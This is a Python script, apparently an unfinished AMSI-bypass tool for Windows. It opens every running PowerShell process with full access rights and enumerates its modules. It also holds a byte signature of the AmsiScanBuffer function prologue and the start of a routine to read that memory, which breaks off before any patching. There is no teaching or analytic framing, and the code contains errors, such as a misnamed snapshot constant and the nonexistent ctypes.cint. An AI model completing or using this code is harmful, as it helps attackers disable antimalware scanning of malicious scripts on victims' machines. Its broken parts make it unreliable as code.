import psutil

import ctypes
from ctypes.wintypes import DWORD, HMODULE, LPDWORD, BYTE, CHAR

k_handle = ctypes.WinDLL("Kernel32.dll")
p_handle = ctypes.WinDLL("Psapi.dll")

PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFFF)


def getPowershellPids():
    ppids = [pid for pid in psutil.pids() if psutil.Process(pid).name() == 'powershell.exe']
    return ppids

for pid in getPowershellPids():
    
    

    process_handle = k_handle.OpenProcess(PROCESS_ALL_ACCESS, False, DWORD(pid))
    if process_handle == 0:
        print("[ERROR] Cannot Grab Process Handle")
    else:
        # print(f'[+] Got process handle of PID powershell at {pid}: {hex(process_handle)}')
        
        # lphModule = (HMODULE * 128)() # <__main__.c_void_p_Array_128 object at 0x0000019C07366340> // array of size 128
        # needed = LPDWORD()
        
        # module_enumeration = p_handle.EnumProcessModules(process_handle, lphModule, len(lphModule), ctypes.byref(needed))
        # modules = [module for module in lphModule if module]
        # k_handle.GetModuleFileNameA.argtypes = [ctypes.c_void_p, ctypes.c_char_p, ctypes.c_ulong]
        
        # for module in modules:
        #     cPath = ctypes.c_buffer(128)
        #     k_handle.GetModuleFileNameA(module, cPath, ctypes.sizeof(cPath))
        #     print(cPath.value.decode())
            
        MAX_PATH = 260
        MAX_MODULE_NAME32 = 255
        class MODULEENTRY32(ctypes.Structure):
            _fields_ = [
                # ("dwSize", DWORD),
                # ("th32ModuleID", DWORD),
                # ("th32ProcessID", DWORD),
                # ("GlblcntUsage", DWORD),
                # ("ProccntUsage", DWORD),
                # ("modBaseAddr", BYTE),
                # ("modBaseSize", DWORD),
                # ("hModule",  HMODULE),
                # ("szModule", CHAR * (MAX_MODULE_NAME32 + 1)),
                # ("szExePath", CHAR * MAX_PATH)
                
                ('dwSize', DWORD) ,
                ('th32ModuleID', DWORD),
                ('th32ProcessID', DWORD),
                ('GlblcntUsage', DWORD),
                ('ProccntUsage', DWORD) ,
                ('modBaseAddr', ctypes.c_size_t) ,
                ('modBaseSize', DWORD) ,
                ('hModule', HMODULE) ,
                ('szModule', CHAR * (MAX_MODULE_NAME32+1)),
                ('szExePath', CHAR * MAX_PATH)
            ]
        me32 = MODULEENTRY32()
        me32.dwSize = ctypes.sizeof(MODULEENTRY32)
        
        TH32CS_SNAPPROCESS = 0x00000008
        
        snapshotHandle = k_handle.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, pid)
        error = k_handle.GetLastError()
        
        ret = k_handle.Module32First(snapshotHandle, ctypes.pointer(me32))
        
        
        print(error)
        
        
        while ret:
            print(f'[+] Got module: {me32.szModule.decode()} loaded at {hex(me32.modBaseAddr)}')
            ret = k_handle.Module32Next(snapshotHandle , ctypes.pointer(me32))
        
        
    
AmsiScanBuffer = (
    b'\x4c\x8b\xdc' +       # mov r11,rsp
    b'\x49\x89\x5b\x08' +   # mov qword ptr [r11+8],rbx
    b'\x49\x89\x6b\x10' +   # mov qword ptr [r11+10h],rbp
    b'\x49\x89\x73\x18' +   # mov qword ptr [r11+18h],rsi
    b'\x57' +               # push rdi
    b'\x41\x56' +           # push r14
    b'\x41\x57' +           # push r15
    b'\x48\x83\xec\x70'     # sub rsp,70h
)

def readBuffer(handle, baseAddress, AmsiScanBuffer):
    # k_handle.ReadProcessMemory.argtypes = [c_ulong, c_void_p, c_void_p, c_ulong, c_int]
    while True:
        lpBuffer =  ctypes.create_string_buffer(b'', len(AmsiScanBuffer))
        nBytes = ctypes.cint(0)   


# Error Notes: 
# BYTE = ctypes.c_size_t